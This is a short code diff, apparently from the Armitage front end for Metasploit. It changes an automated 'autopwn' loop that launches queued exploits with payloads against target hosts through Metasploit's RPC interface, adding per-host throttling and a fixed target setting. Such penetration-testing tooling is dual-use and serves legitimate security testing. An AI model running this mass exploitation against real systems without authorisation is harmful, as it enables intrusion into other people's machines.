@@ -173,13 +173,22 @@ sub smarter_autopwn {
 		$progress = [new ProgressMonitor: $null, "Launching Exploits...", "...", 0, size(@attacks)];
 
 		thread(lambda({
-			local('$host $ex $payload $x $rport');
+			local('$host $ex $payload $x $rport %wait');
 			while (size(@attacks) > 0 && [$progress isCanceled] == 0) {
-				yield 150;
 				($host, $ex, $payload, $rport) = @attacks[0];
+
+				# let's throttle our exploit/host velocity a little bit.
+				if ((ticks() - %wait[$host]) > 1250) {
+					yield 250;
+				}
+				else {
+					yield 1500;
+				}
+
 				[$progress setNote: "$host $+ : $+ $rport ( $+ $ex $+ )"];
 				[$progress setProgress: $x + 0];
-				call($client, "module.execute", "exploit", $ex, %(PAYLOAD => $payload, RHOST => $host, LPORT => randomPort() . '', RPORT => "$rport", SSL => iff($rport == 443, '1')));
+				call($client, "module.execute", "exploit", $ex, %(PAYLOAD => $payload, RHOST => $host, LPORT => randomPort() . '', RPORT => "$rport", TARGET => '0', SSL => iff($rport == 443, '1')));
+				%wait[$host] = ticks();
 				$x++; 
 				@attacks = sublist(@attacks, 1);
 			}
